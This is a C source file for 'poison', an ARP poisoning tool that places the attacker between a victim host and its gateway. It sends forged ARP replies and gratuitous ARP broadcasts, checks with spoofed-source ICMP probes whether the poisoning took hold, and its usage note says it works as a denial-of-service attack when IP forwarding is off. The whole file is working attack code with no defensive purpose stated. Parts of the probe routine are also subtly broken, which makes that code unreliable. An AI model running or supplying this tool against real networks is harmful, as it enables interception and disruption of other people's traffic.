/*
 * poison.c - ARP poisoning tool (bidirectional MITM)
 *
 * Usage: ./poison <iface> <victim_ip> <gateway_ip>
 *
 * - Resolve the MAC addresses of the victim and the gateway via ARP request/reply
 * - Periodically sends unicast ARP replies (low noise)
 * - Sends a broadcast GARP every 10 cycles (~20 s) as reinforcement
 * - Detects whether the target's cache is pointing to us (via a probe)
 * - If `ip_forward` is disabled, it functions as a DoS attack
 *
 * Build: gcc -Wall -Wextra -O2 -o poison poison.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <time.h>
#include <signal.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>

#define ETH_P_ARP 0x0806
#define POISON_INTERVAL 2          /* seconds between cycles */
#define GARP_EVERY    10           /* GARP broadcast every N cycles */
#define RESOLVE_TIMEOUT 3          /* seconds to wait for ARP replies */
#define RECHECK_EVERY 20           /* seconds between each poisoning check */

struct arp_packet {
	struct ethhdr eth;
	uint16_t htype, ptype;
	uint8_t  hlen, plen;
	uint16_t opcode;
	uint8_t  sender_mac[6];
	uint8_t  sender_ip[4];
	uint8_t  target_mac[6];
	uint8_t  target_ip[4];
} __attribute__((packed));         // sizeof == 42

static volatile sig_atomic_t g_stop = 0;

static void
on_sigint(int sig)
{
	(void)sig;
	g_stop = 1;
}

static void
print_mac(const char* label, const uint8_t* mac)
{
	printf("%s: %02x:%02x:%02x:%02x:%02x:%02x\n",
		label, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static int
get_if_mac(const char* iface, uint8_t* mac)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		return -1;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		close(fd);
		return -1;
	}

	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
	return 0;
}

static int
get_if_ip(const char* iface, uint8_t* ip)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		return -1;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		close(fd);
		return -1;
	}

	memcpy(ip, &((struct sockaddr_in*) &ifr.ifr_addr)->sin_addr, 4);
	close(fd);
	return 0;
}

static void
fill_arp_hdr(struct arp_packet* pkt, uint16_t opcode)
{
	memset(pkt, 0, sizeof(*pkt));
	pkt->eth.h_proto = htons(ETH_P_ARP);
	pkt->htype = htons(ARPHRD_ETHER);
	pkt->ptype = htons(ETH_P_IP);
	pkt->hlen  = 6;
	pkt->plen  = 4;
	pkt->opcode = htons(opcode);
}

static void
fill_addrs(struct arp_packet* pkt, const uint8_t* eth_dst,
           const uint8_t* my_mac, const uint8_t* spoof_ip,
           const uint8_t* dst_mac, const uint8_t* dst_ip)
{
	memcpy(pkt->eth.h_dest, eth_dst, 6);
	memcpy(pkt->eth.h_source, my_mac, 6);

	memcpy(pkt->sender_mac, my_mac, 6);
	memcpy(pkt->sender_ip, spoof_ip, 4);
	memcpy(pkt->target_mac, dst_mac, 6);
	memcpy(pkt->target_ip, dst_ip, 4);
}

/*
* Sends an ARP packet. If `broadcast != 0`, the Ethernet destination is forced to ff:ff:ff:ff:ff:ff;
* otherwise, the provided MAC address is used (unicast). 
*/
static int
send_arp(int sockfd, struct sockaddr_ll* sa, const uint8_t* dst_mac,
         const uint8_t* my_mac, const uint8_t* spoof_ip,
         const uint8_t* tha, const uint8_t* tpa,
         uint16_t opcode, int broadcast)
{
	struct arp_packet pkt;
	uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	const uint8_t* eth_dst = broadcast ? bcast : dst_mac;

	fill_arp_hdr(&pkt, opcode);
	fill_addrs(&pkt, eth_dst, my_mac, spoof_ip, tha, tpa);

	sa->sll_halen = 6;
	memcpy(sa->sll_addr, eth_dst, 6);

	if (sendto(sockfd, &pkt, sizeof(pkt), 0,
	           (struct sockaddr*) sa, sizeof(*sa)) < 0) {
		perror("sendto");
		return -1;
	}

	return 0;
}

/* receives an ARP frame from the socket; returns 0 if something was read */
static int
recv_arp(int sockfd, struct arp_packet* out)
{
	uint8_t buf[128];
	ssize_t n = recv(sockfd, buf, sizeof(buf), MSG_DONTWAIT);

	if (n < (ssize_t) sizeof(*out))
		return -1;

	memcpy(out, buf, sizeof(*out));
	return 0;
}

/*
* Resolve IP -> MAC by sending a broadcast ARP request and waiting for a reply. 
* Returns 0 on success, populating out_mac. 
*/
static int
arp_resolve(int sockfd, struct sockaddr_ll* sa,
            const uint8_t* my_mac, const uint8_t* my_ip,
            const uint8_t* target_ip, uint8_t* out_mac,
            int timeout_sec)
{
	uint8_t bcast[6]    = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint8_t zero_mac[6] = {0};
	time_t deadline = time(NULL) + timeout_sec;

	/* ARP request: opcode 1, tha zerado, unicast */
	if (send_arp(sockfd, sa, bcast, my_mac, my_ip,
	             zero_mac, target_ip, ARPOP_REQUEST, 1) < 0)
		return -1;

	while (time(NULL) < deadline && !g_stop) {
		struct pollfd pfd = { .fd = sockfd, .events = POLLIN };
		struct arp_packet rep;

		if (poll(&pfd, 1, 500) <= 0)
			continue;
		if (recv_arp(sockfd, &rep) < 0)
			continue;
		if (ntohs(rep.opcode) != ARPOP_REPLY)
			continue;
		/* the reply must come from the IP we queried */
		if (memcmp(rep.sender_ip, target_ip, 4) != 0)
			continue;
		/* ignore echo from our own MAC (rare case) */
		if (memcmp(rep.sender_mac, my_mac, 6) == 0)
			continue;

		memcpy(out_mac, rep.sender_mac, 6);
		return 0;
	}

	return -1;
}

/*
* Probe: sends an ICMP echo with a spoofed source IP (spoof_ip) to the target
* and waits for a reply. If the reply arrives with the destination Ethernet
* address set to our MAC, the target's cache points to us -> poisoning is active. 
*
* Returns: 1 = poisoned, 0 = cache is not pointing to us, -1 = error. 
*/
static int
probe_poisoned(int sockfd, struct sockaddr_ll* sa,
               const uint8_t* my_mac, const uint8_t* my_ip,
               const uint8_t* spoof_ip, const uint8_t* target_ip,
               uint8_t* reply_mac, int timeout_ms)
{
	int fd_ip;
	uint8_t frame[128];
	struct timeval tv = { .tv_sec = timeout_ms / 1000,
	                      .tv_usec = (timeout_ms % 1000) * 1000 };

	fd_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if (fd_ip < 0) {
		perror("socket(AF_PACKET, IP)");
		return -1;
	}

	if (setsockopt(fd_ip, SOL_SOCKET, SO_RCVTIMEO,
	               &tv, sizeof(tv)) < 0) {
		perror("setsockopt");
		close(fd_ip);
		return -1;
	}

	sa->sll_halen = 6;
	memcpy(sa->sll_addr, target_ip /* placeholder, fixed below */, 6);

	/*
	* Here, we need the target's L2 MAC address for the IP frame. The caller
	* already has it; for simplicity, we reuse the ARP socket: we send via
	* sockaddr_ll with sll_addr set to the target's MAC (provided via
	* reply_mac when known). Since this probe runs AFTER the resolution
	* step, the caller passes the target's MAC in reply_mac, which we then overwrite. 
	*/
	/* Note: reply_mac is used as an 'OUT' parameter (the source MAC of the reply)
	* below; the target's MAC is provided as a separate parameter in the
	* main loop. */
	(void)reply_mac;

	/* 
	* ICMP echo request "crafted by hand" - minimum version: 
	* ether + ip + icmp, total ~42 bytes. Source IP = spoof_ip. 
	*/
	{
		uint8_t pkt[42];
		struct ethhdr* eth = (struct ethhdr*) pkt;
		/* ip header */
		pkt[14] = 0x45;                       /* version + ihl */
		pkt[15] = 0x00;                       /* tos */
		pkt[16] = 0x00; pkt[17] = 28;         /* total length (20+8) */
		pkt[18] = 0x00; pkt[19] = 0x01;       /* id */
		pkt[20] = 0x40;                       /* flags: DF */
		pkt[21] = 0x00;                       /* frag off */
		pkt[22] = 64;                         /* ttl */
		pkt[23] = 1;                          /* proto = icmp */
		pkt[24] = 0x00; pkt[25] = 0x00;       /* checksum (fix later) */
		memcpy(pkt + 26, spoof_ip, 4);        /* src = spoofed gateway */
		memcpy(pkt + 30, target_ip, 4);       /* dst */
		/* icmp echo */
		pkt[34] = 8;                          /* type = echo request */
		pkt[35] = 0;                          /* code */
		pkt[36] = 0x00; pkt[37] = 0x00;       /* icmp checksum */
		pkt[38] = 0x12; pkt[39] = 0x34;       /* id */
		pkt[40] = 0x00; pkt[41] = 0x01;       /* seq */

		/* checksum IP */
		{
			uint32_t sum = 0;
			int i;
			for (i = 0; i < 20; i += 2)
				sum += (pkt[14 + i] << 8) | pkt[14 + i + 1];
			while (sum >> 16)
				sum = (sum & 0xffff) + (sum >> 16);
			pkt[24] = ~(sum & 0xff);
			pkt[25] = ~((sum >> 8) & 0xff);
		}

		(void)eth; /* eth dst/src populated by the caller via sa */

		/* the caller needs to provide the target's MAC address; to simplify,
		* the probe uses an ARP socket in "broadcast-on-interface" mode
		* via sendto, with the target's address set in sll_addr */
		if (sendto(fd_ip, pkt, sizeof(pkt), 0,
		           (struct sockaddr*) sa, sizeof(*sa)) < 0) {
			perror("sendto(probe)");
			close(fd_ip);
			return -1;
		}

		/* waits for the reply and checks the ether dst */
		while (1) {
			ssize_t n = recv(fd_ip, frame, sizeof(frame), 0);
			if (n < 0) {
				close(fd_ip);
				return 0; /* timeout: not poisoned (or no reply) */
			}
			if (n >= 42) {
				/* ether dst = who received; if it's us, it's poisoned */
				if (memcmp(frame, my_mac, 6) == 0) {
					close(fd_ip);
					return 1;
				}
				/* reply sent to another MAC -> cache points to the real gateway */
				close(fd_ip);
				return 0;
			}
		}
	}
}

int
main(int argc, char** argv)
{
	const char* iface;
	const char* victim_ip_str;
	const char* gw_ip_str;

	uint8_t my_mac[6], my_ip[4];
	uint8_t victim_ip[4], gw_ip[4];
	uint8_t victim_mac[6], gw_mac[6];

	int sock;
	struct sockaddr_ll sa;
	int cycle = 0;

	signal(SIGINT, on_sigint);
	signal(SIGTERM, on_sigint);

	if (argc != 4) {
		fprintf(stderr,
			"usage: %s <iface> <victim_ip> <gateway_ip>\n"
			"note: if ip_forward is disabled, the attack functions as a DoS\n",
			argv[0]);
		return 1;
	}

	iface        = argv[1];
	victim_ip_str = argv[2];
	gw_ip_str     = argv[3];

	if (inet_pton(AF_INET, victim_ip_str, victim_ip) != 1 ||
	    inet_pton(AF_INET, gw_ip_str, gw_ip) != 1) {
		fprintf(stderr, "[-] invalid IP address\n");
		return 1;
	}

	if (get_if_mac(iface, my_mac) < 0) {
		perror("get_if_mac");
		return 1;
	}
	if (get_if_ip(iface, my_ip) < 0) {
		perror("get_if_ip");
		return 1;
	}

	print_mac("[*] attacker_mac", my_mac);
	printf("[*] attacker_ip: %u.%u.%u.%u\n",
		my_ip[0], my_ip[1], my_ip[2], my_ip[3]);

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) {
		perror("socket(AF_PACKET)");
		return 1;
	}

	memset(&sa, 0, sizeof(sa));
	sa.sll_family   = AF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP);
	sa.sll_ifindex  = if_nametoindex(iface);
	if (sa.sll_ifindex == 0) {
		fprintf(stderr, "[-] unknown interface: %s\n", iface);
		close(sock);
		return 1;
	}
	sa.sll_hatype = ARPHRD_ETHER;
	sa.sll_pkttype = PACKET_HOST;

	if (bind(sock, (struct sockaddr*) &sa, sizeof(sa)) < 0) {
		perror("bind");
		close(sock);
		return 1;
	}

	printf("[*] resolving victim MAC via ARP...\n");
	if (arp_resolve(sock, &sa, my_mac, my_ip, victim_ip, victim_mac,
	                RESOLVE_TIMEOUT) < 0) {
		fprintf(stderr, "[-] could not resolve victim %s\n", victim_ip_str);
		close(sock);
		return 1;
	}
	print_mac("[+] victim_mac", victim_mac);

	printf("[*] resolving gateway MAC via ARP...\n");
	if (arp_resolve(sock, &sa, my_mac, my_ip, gw_ip, gw_mac,
	                RESOLVE_TIMEOUT) < 0) {
		fprintf(stderr, "[-] could not resolve gateway %s\n", gw_ip_str);
		close(sock);
		return 1;
	}
	print_mac("[+] gateway_mac", gw_mac);

	printf("[*] poisoning: %s (%s) <-> %s (%s)\n",
		victim_ip_str, victim_mac[0] == 0xff ? "broadcast" : "unicast",
		gw_ip_str, "unicast");
	printf("[*] ensure: echo 1 > /proc/sys/net/ipv4/ip_forward\n");

	while (!g_stop) {
		int is_garp_cycle = (cycle % GARP_EVERY == 0 && cycle > 0);

		/*
		* Unicast:
		*   victim <- gateway : we tell the victim that we are the gateway
		*   gateway <- victim : we tell the gateway that we are the victim
		*/
		send_arp(sock, &sa, victim_mac, my_mac, gw_ip,
		         victim_mac, victim_ip, ARPOP_REPLY, 0);
		send_arp(sock, &sa, gw_mac, my_mac, victim_ip,
		         gw_mac, gw_ip, ARPOP_REPLY, 0);

		/* GARP boost broadcast, periodically */
		if (is_garp_cycle) {
			uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
			uint8_t zero_mac[6] = {0};

			send_arp(sock, &sa, bcast, my_mac, gw_ip,
			         bcast /* tha = broadcast */, victim_ip,
			         ARPOP_REPLY, 1);
			send_arp(sock, &sa, bcast, my_mac, victim_ip,
			         bcast, gw_ip, ARPOP_REPLY, 1);
			(void)zero_mac;
			printf("[+] sent GARP broadcast (cycle %d)\n", cycle);
		}

		/* periodically checks whether we are still on the right path */
		if (cycle % RECHECK_EVERY == 0 && cycle > 0) {
			uint8_t reply_mac[6];
			int st = probe_poisoned(sock, &sa, my_mac, my_ip,
			                        gw_ip, victim_ip, reply_mac, 1500);
			switch (st) {
			case 1:
				printf("[*] probe: victim cache points to us (＾◡＾)\n");
				break;
			case 0:
				printf("[!] probe: victim cache doesn't point to us (◡︵◡) - "
				       "check DAI/static input/filtered ARP\n");
				break;
			default:
				printf("[?] probe: sending error\n");
				break;
			}
		}

		printf("[+] sent replies (cycle %d)\n", cycle);
		cycle++;
		sleep(POISON_INTERVAL);
	}

	printf("\n[*] shutting down\n");
	close(sock);
	return 0;
}